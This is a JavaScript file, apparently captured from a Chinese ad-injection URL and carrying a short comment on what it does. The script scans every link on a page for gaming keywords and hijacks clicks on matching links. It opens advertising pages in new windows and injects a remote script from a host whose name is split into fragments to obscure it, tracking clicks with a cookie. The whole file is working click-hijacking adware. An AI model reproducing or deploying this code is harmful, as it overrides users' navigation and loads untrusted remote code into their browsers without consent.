// http://s1.gzmjnx.cn/res/cres/kwd.js

// 本脚本会对当页面中的所有的a标签以及a标签的子元素实行递归遍历(性能问题!!!)寻找特定的关键字
// 匹配后,添加点击事件执行跳转
(function(d) {
    var sCkie = new function() {
        this.expTime = function(millisecond) {
            if (millisecond.length == 0) {
                millisecond = 0
            }
            var exp = new Date();
            exp.setTime(exp.getTime() + parseInt(millisecond));
            return exp.toGMTString()
        };
        this.add = function(name, value, expires, path, domain, secure) {
            d.cookie = name + "=" + encodeURI(value) + (expires ? (";expires=" + expires) : "") + (path ? (";path=" + path) : "") + (domain ? (";domain=" + domain) : "") + ((secure) ? ";secure" : "")
        };
        this.get = function(name) {
            var arg = name + "=";
            var alen = arg.length;
            var theCookie = "" + d.cookie;
            var inCookieSite = theCookie.indexOf(arg);
            if (inCookieSite == -1 || name == "") {
                return ""
            }
            var begin = inCookieSite + alen;
            var end = theCookie.indexOf(";", begin);
            if (end == -1) {
                end = theCookie.length
            }
            return decodeURI(theCookie.substring(begin, end))
        }
    };
    var vol = [{
        url: "http://www.51miyou.cn/advertise/main_4.html",
        kwd: ["游戏", "花千骨", "修仙", "唯美", "漂亮", "美拍", "灵域", "三国", "魔兽", "页游", "网游", "剑侠"]
    }, {
        url: "http://gjrowx.code.mytanwan.com/htmlcode/1598.html",
        kwd: ["传奇", "热血", "怒斩", "烈焰", "怀旧", "沙城", "裁决", "称霸", "pk", "PK", "掉装备", "杀人", "盛大", "征途", "帮会", "战斗", "刷怪", "爆装备", "霸业", "原味", "经典"]
    }];
    try {
        var urlOjb = {};
        var e = d.getElementsByTagName("A");
        for (var j = 0; j < e.length; j++) {
            if (e[j].innerHTML && e[j].href && e[j].href.length > 10) {
                for (var i = 0; i < vol.length; i++) {
                    var isd = 0;
                    var obj = vol[i];
                    for (var k = 0; k < obj.kwd.length; k++) {
                        if (e[j].innerHTML.indexOf(obj.kwd[k]) >= 0) {
                            urlOjb[e[j].innerHTML] = obj.url;
                            e[j].onclick = function() {
                                var ckie = 0;
                                var sid = "lpvt_438c9e92fb6e38d13e2e76eaa502bdd3";
                                var skie = sCkie.get(sid);
                                if (skie != "") {
                                    ckie = parseInt(skie)
                                }
                                if (ckie < 1) {
                                    sCkie.add(sid, "1", sCkie.expTime(30 * 60 * 1000), 0, 0, 0);
                                    (function(d) {
                                        function $a(p) {
                                            var x = d.getElementsByTagName("head")[0];
                                            x.appendChild($s(p))
                                        }
                                        function $c(n) {
                                            return d.createElement(n)
                                        }
                                        function $s(p) {
                                            var j = $c("script");
                                            j.src = p;
                                            j.async = true;
                                            j.type = "text/javascript";
                                            return j
                                        }
                                        var u = {
                                            j: "ht",
                                            c: "com",
                                            q: "tp:",
                                            m: "orjx.",
                                            n: "vict",
                                            d: "img."
                                        };
                                        $a(u.j + u.q + "//" + u.d + u.n + u.m + u.c + "/cnzz/dw/bds/clk.php?u=" + "keyword_fmt" + "&a=" + Math.random())
                                    })(document);
                                    window.open(urlOjb[this.innerHTML], "_blank");
                                    return false
                                }
                                return true
                            };
                            isd = 1;
                            break
                        }
                    }
                    if (isd == 1) {
                        break
                    }
                }
            }
        }
    } catch (e) {}
})(document);

